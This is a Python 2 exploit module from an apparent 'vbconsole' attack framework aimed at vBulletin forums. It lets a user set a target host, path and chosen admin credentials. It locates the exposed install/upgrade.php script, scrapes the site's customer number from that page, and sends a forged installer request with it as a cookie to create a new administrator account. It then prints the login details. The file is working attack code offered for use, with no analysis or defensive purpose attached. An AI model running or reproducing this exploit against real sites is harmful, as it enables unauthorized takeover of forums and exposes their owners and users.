#!/usr/bin/env python
from exploits.includes.prettytable import PrettyTable
from bs4 import BeautifulSoup
import urllib
import urllib2
import httplib
import cookielib
import pycurl
import cStringIO
import re
import HTMLParser
import urlparse
import md5


def get_server_status_code(url):
    host, path = urlparse.urlparse(url)[1:3]
    try:
        conn = httplib.HTTPConnection(host)
        conn.request('HEAD', path)
        return conn.getresponse().status
    except StandardError:
        return False
 
def check_url(url):
    good_codes = [httplib.OK, httplib.FOUND, httplib.MOVED_PERMANENTLY]
    return get_server_status_code(url) in good_codes

def get_customer_number(url):
	openurl = urllib2.urlopen(url)
	response = openurl.read()
	for search in response.split("\n"):
		if 'var CUSTNUMBER' in search:
			custnum = search.strip()
			custnum = custnum.replace("var CUSTNUMBER = ", "")
			custnum = custnum.strip()
			custnum = custnum.strip(";")
			custnum = custnum.strip("\"")
			return custnum
		else:
			custnum = 'none'
	print ('No customer number found!')
	print ('Continuing with exploit, site might be nulled.')
	return custnum

def initiate():
	exvars = [
	['HOST', 'Not Set', 'Host of target with http://!'],
	['PATH', '/forums', 'Path to forums on target host'],
	['USERNAME', 'Not Set', 'Username for admin account'],
	['PASSWORD', 'Not Set', 'Password for admin account'],
	['EMAIL', 'Not Set', 'Email for admin account']
	]

	print ('\nType help for more information')
	while True:
		try:
			vbupgrade = raw_input('vbconsole('+colored('/exploits/vbupgrade', 'red')+')> ')
			if vbupgrade == 'exit':
				print ("Going back to home.")
				break
			elif vbupgrade == 'help':
				print ('show vars ~> Shows variables needed to run exploit and their current values')
				print ('set {VAR NAME} {VAR VALUE} ~> Set {VAR NAME} to {VAR VALUE}')
				print ('get prefix ~> Looks for table prefix')
				print ('run ~> Run the exploit')
				print ('exit ~> Go back to vBconsole home')
			elif vbupgrade == 'show vars':
				print ("Variables needed to run exploit.\n")
				count = 0
				while count < len(exvars):
					print (exvars[count][0]+" = "+exvars[count][1]+" ("+exvars[count][2]+")")
					count += 1
			elif vbupgrade[0:3] == 'set':
				setvar = vbupgrade.split(' ')[1]
				setval = vbupgrade.split(' ')[2:]
				count = 0
				while count < len(exvars):
					if exvars[count][0] == setvar:
						exvars[count][1] = " ".join(setval)
					count += 1
			elif vbupgrade == 'run':
				if exvars[0][1].endswith('/'):
					host = exvars[0][1][:-1]
				else:
					host = exvars[0][1]
				if exvars[1][1] != '/' and exvars[1][1].endswith('/'):
					path = exvars[1][1]+"install/upgrade.php"
				elif exvars[1][1] == '/':
					path = exvars[1][1]+"install/upgrade.php"
				else:
					path = exvars[1][1]+"/install/upgrade.php"
				url = host+path
				if check_url(url):
					customernum = get_customer_number(url)
					opener = urllib2.build_opener()
					opener.addheaders.append(('Cookie', 'bbcustomerid='+customernum))
					postdata = [
					('ajax', '1'),
					('version', 'install'),
					('checktable', 'false'),
					('firstrun', 'false'),
					('step', '7'),
					('startat', '0'),
					('only', 'false'),
					('customerid', customernum),
					('options[skiptemplatemerge]', '0'),
					('response', 'yes'),
					('htmlsubmit', '1'),
					('htmldata[username]', exvars[2][1]),
					('htmldata[password]', exvars[3][1]),
					('htmldata[confirmpassword]', exvars[3][1]),
					('htmldata[email]', exvars[4][1])
					]
					postdata = urllib.urlencode(postdata)
					response = opener.open(url, postdata).read()
					soup = BeautifulSoup(response)
					soup2 = soup.find('message', attrs={'replace' : '0'})
					if soup2:
						print (soup2.string)
						print ('\nUsername: '+exvars[2][1])
						print ('Password: '+exvars[3][1])
						print ('Email: '+exvars[4][1])
						print url.replace('install/upgrade.php', 'login.php')
					else:
						print ('Failed to create admin account!')
				else:
					print ("Can not find upgrade script at: "+url)
		except KeyboardInterrupt:
			print ("\nGoing back to home.")
			break
